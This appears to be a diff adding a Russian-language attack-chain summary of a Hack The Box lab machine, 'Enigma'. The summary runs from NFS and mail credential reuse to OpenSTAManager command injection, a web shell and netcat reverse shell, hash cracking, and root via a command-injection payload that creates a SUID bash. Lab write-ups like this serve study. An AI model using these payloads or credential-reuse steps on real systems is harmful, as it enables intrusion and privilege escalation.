@@ -1,3 +1,53 @@
+ENIGMA (HTB) — ATTACK CHAIN
+
+Reconnaissance
+├── nmap -sC -sV -p- enigma.htb → 22 (SSH, только ключи), 80 (nginx "Enigma Corp")
+├── 110/143/993/995 (Dovecot POP3/IMAP)
+└── 111/2049 + mountd/nlockmgr (NFS)
+
+Foothold (NFS)
+├── showmount -e enigma.htb → /srv/nfs/onboarding *
+├── mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
+├── pdftotext New_Employee_Access.pdf → kevin:Enigma2024! (webmail http://mail001.enigma.htb)
+└── /etc/hosts: 10.129.239.191 enigma.htb mail001.enigma.htb
+
+Lateral Movement (Password Reuse + Mail)
+├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!' → письмо от Sarah
+├── Roundcube → sarah:Enigma2024! (тот же пароль)
+├── Письмо IT → OpenSTAManager: admin:Ne3s4rtars78s
+└── /etc/hosts: support_001.enigma.htb
+
+Exploitation (OpenSTAManager CVE-2025-69212)
+├── Версия: 2.9.8 (info.php)
+├── CVE-2025-69212: OS Command Injection через P7M-файлы (decodeP7M → exec без экранирования)
+├── ZIP с вредоносным именем файла → Sales → Invoices → Importazione FE
+├── Подтверждение RCE: curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
+│   └── uid=33(www-data)
+└── Reverse shell: nc -lvnp 4444 → www-data
+
+Lateral Movement (Config → MySQL → Hash)
+├── cat /var/www/html/openstamanager/config.inc.php
+│   └── brollin / Fri3nds@9099
+├── mysql -u brollin -p → SELECT username, password FROM zz_users
+│   └── haris:$2y$... (bcrypt)
+└── hashcat -m 3200 → haris:bestfriends
+
+User Flag
+├── su haris
+└── cat ~/user.txt
+
+Privilege Escalation (OliveTin)
+├── ps aux → /usr/local/bin/OliveTin (root, 127.0.0.1:1337)
+├── cat /etc/OliveTin/config.yaml → backup_database (shell: mysqldump {{ db_pass }})
+├── API: POST /api/olivetin.api.v1.OliveTinApiService/GetDashboard
+├── Тестовый вызов → подтверждение выполнения mysqldump
+├── Exploit: db_pass = "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"
+├── POST /api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
+└── /tmp/.bs -p → root → cat /root/root.txt (<ROOT_FLAG>)
+
+
+
+
 1. Разведка (Reconnaissance)
 
 **Полное сканирование портов:**
